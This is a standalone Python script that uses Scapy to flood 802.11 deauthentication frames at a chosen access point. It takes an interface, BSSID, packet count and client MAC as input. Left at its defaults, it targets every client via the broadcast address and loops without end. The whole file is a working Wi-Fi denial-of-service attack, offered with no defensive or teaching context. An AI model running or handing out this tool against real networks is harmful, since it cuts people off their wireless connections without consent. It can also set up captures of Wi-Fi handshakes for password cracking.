#!/usr/bin/env python

import os
import sys

try:
    if len(sys.argv) == 2 and sys.argv[1] == "--help":
        print("usage: " + os.path.basename(__file__) + " <monitor interface> <AP BSSID> <packets> <client>")
        sys.exit(0)

    from scapy.all import *

    iface  = ""
    bssid  = ""
    count  = ""
    client = ""

    if len(sys.argv) > 1: iface = sys.argv[1]
    while iface == "":    iface = input("INTERFACE: ")
    if len(sys.argv) > 2: bssid = sys.argv[2]
    while bssid == "":    bssid = input("BSSID: ")
    if len(sys.argv) > 3: count = sys.argv[3]
    if count == "":       count = "0"
    if len(sys.argv) > 4: client = sys.argv[4]
    if client == "":      client = "FF:FF:FF:FF:FF:FF"

    conf.verb = 0
    conf.iface = iface

    # deauth packet
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason = 7)
    def deauth(num):
        sendp(packet)
        print(conf.iface + ' ' + bssid + ' ' + client + ' - ' + str(num))

    num = 0
    if int(count) == 0:
        while True:
            num = num + 1
            deauth(num)
    else:
        for n in range(int(count)):
            num = num + 1
            deauth(num)

except KeyboardInterrupt: pass
except PermissionError: print("Use sudo.");
